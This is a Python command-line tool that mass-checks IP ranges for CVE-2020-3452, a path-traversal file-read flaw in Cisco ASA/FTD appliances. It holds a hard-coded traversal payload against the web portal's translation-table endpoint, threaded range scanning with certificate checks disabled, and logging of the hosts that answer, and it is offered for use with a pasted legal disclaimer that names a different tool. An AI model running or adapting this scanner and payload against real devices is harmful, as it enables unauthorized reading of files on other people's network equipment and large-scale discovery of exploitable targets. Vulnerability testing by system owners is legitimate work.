import sys
import requests
import argparse
import urllib3
from concurrent.futures import ThreadPoolExecutor
import time


# Autor script: MrCl0wn
# Blog: http://blog.mrcl0wn.com
# GitHub: https://github.com/MrCl0wnLab
# Twitter: https://twitter.com/MrCl0wnLab
# Email: mrcl0wnlab\@\gmail.com
#
#
# Cisco Adaptive Security Appliance and FTD Unauthorized Remote File Reading
# https://nvd.nist.gov/vuln/detail/CVE-2020-3452
# https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86
# https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-3452.nse
#
# WARNING
# +------------------------------------------------------------------------------+
# |  [!] Legal disclaimer: Usage of afdWordpress for attacking                   |
# |  targets without prior mutual consent is illegal.                            |
# |  It is the end user's responsibility to obey all applicable                  |
# |  local, state and federal laws.                                              |
# |  Developers assume no liability and are not responsible for any misuse or    |
# |  damage caused by this program                                               |
# +------------------------------------------------------------------------------+

BANNER = '''\033[1;31m
                   ____   ___ ____   ___       _____ _  _  ____ ____  
     _____   _____|___ \ / _ \___ \ / _ \     |___ /| || || ___|___ \ 
    / __\ \ / / _ \ __) | | | |__) | | | |_____ |_ \| || ||___ \ __) |
   | (__ \ V /  __// __/| |_| / __/| |_| |_____|__) |__  | __)  / __/ 
    \___| \_/ \___|_____|\___/_____|\___/     |____/   |_||____/_____|

  \033[1;37mchecker by: MrCl0wnLab\n  https://github.com/MrCl0wnLab\033[0m
'''

def save_value_file(value: str, file: str):
    myFile = open(file, 'a+')
    myFile.write(value)
    myFile.close()


def log_process(target, result):
    save_value = f"\"{target}\",\"{result}\"\n"
    if result == 200:
        print(f"\033[1;32m [+] {target}",f"{result}\033[0m")
        save_value_file(save_value, 'output.log')
    else:
        print(f"\033[1;31m [x] {target}",f"{result}\033[0m")
        save_value_file(save_value, 'error.log')


def send_request(url: str):
    try:
        if url:
            result_request = requests.get(url, verify=False, timeout=TIME_OUT)
            return result_request
    except:
        log_process(url,None)


def check_vuln(target: str):
    try:
        target_xpl = 'http://'+target+XPL
        result = send_request(target_xpl)
        log_process(target_xpl, result.status_code)
        time.sleep(TIME_SLEEP)
    except:
        pass

# REF CODE: https://github.com/pootzko/tkit.dev/issues/21
def ipRange(start_ip, end_ip):
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    temp = start
    ip_range = []
    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i-1] += 1
        ip_range.append(".".join(map(str, temp)))
    return ip_range


def start(ip_start, ip_end):
    try:
        IP_RANGE = ipRange(ip_start, ip_end)
        executor = ThreadPoolExecutor(max_workers=MAX_CONECTION_THREAD)
        executor.map(check_vuln, IP_RANGE)
        executor.shutdown(wait=True)
    except:
        pass
        


# Using as command line
if __name__ == '__main__':

    TIME_OUT = 10
    TIME_SLEEP = 3
    XPL = '/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
    
    print(BANNER)

    urllib3.disable_warnings()

    parser_arg_menu = argparse.ArgumentParser(
        prog='tool', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=20)
    )
    parser_arg_menu.add_argument(
        "--target", help="URL to request Ex: 192.168.15.1", 
        metavar="<ip>",  required=False
    )
    parser_arg_menu.add_argument(
        "--range", help="Range IP Ex: 192.168.15.1,192.168.15.100",  
        metavar="<ip-start>,<ip-end>", required=False
    )
    parser_arg_menu.add_argument(
        "--thread", help="Eg. 20",  
        metavar="<10>", default=20, required=False
    )

    arg_menu = parser_arg_menu.parse_args()
    MAX_CONECTION_THREAD = int(arg_menu.thread)

    if(arg_menu.range):
        range_list = arg_menu.range.split(",")
        start(range_list[0],range_list[1])
        
    if(arg_menu.target):
        check_vuln(arg_menu.target)